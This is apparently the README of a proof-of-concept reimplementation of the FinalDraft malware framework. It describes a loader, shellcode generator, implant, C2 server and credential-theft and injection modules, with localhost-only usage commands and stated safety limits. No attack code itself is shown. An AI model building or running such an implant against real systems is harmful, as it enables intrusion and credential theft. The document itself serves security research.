# FinalFinal - FinalDraft Exploit PoC

## Overview

This is a proof-of-concept demonstration of the FinalDraft malware framework discovered by Elastic Security Labs. This implementation is for **educational and security research purposes only**.

## Architecture

Based on the FinalDraft attack chain:

```
PATHLOADER → Shellcode → FINALDRAFT → C2 Communication
                              ↓
                    Named Pipes & Process Injection
                              ↓
                    MS Graph API (Covert Channel)
```

## Components

1. **pathloader.py** - Initial loader that downloads and decrypts shellcode
2. **shellcode_generator.py** - Creates encrypted shellcode payloads
3. **finaldraft.py** - Main implant with C2 capabilities
4. **c2_server.py** - Command and Control server
5. **modules/** - Additional capabilities (process injection, credential theft, etc.)

## Safety Limitations

This PoC includes the following safety measures:
- ⚠️ Simulated process injection (no actual injection)
- ⚠️ Mock MS Graph API calls (no real API access)
- ⚠️ Limited to localhost communication only
- ⚠️ Extensive logging for research purposes
- ⚠️ No persistence mechanisms enabled by default
- ⚠️ Requires explicit confirmation for sensitive operations

## Installation

```bash
pip install -r requirements.txt
```

## Usage

### 1. Start the C2 Server
```bash
python c2_server.py --host 127.0.0.1 --port 8443
```

### 2. Generate Shellcode
```bash
python shellcode_generator.py --output payload.bin
```

### 3. Deploy Pathloader
```bash
python pathloader.py --c2 http://127.0.0.1:8443 --payload payload.bin
```

### 4. Run FinalDraft Implant
```bash
python finaldraft.py --c2 http://127.0.0.1:8443
```

## Research References

- [Elastic Security Labs - FinalDraft Analysis](https://www.elastic.co/security-labs/finaldraft)

## Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY**

This software is provided for educational purposes and authorized security research only. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse of this software.

## License

MIT License - For Research Purposes Only
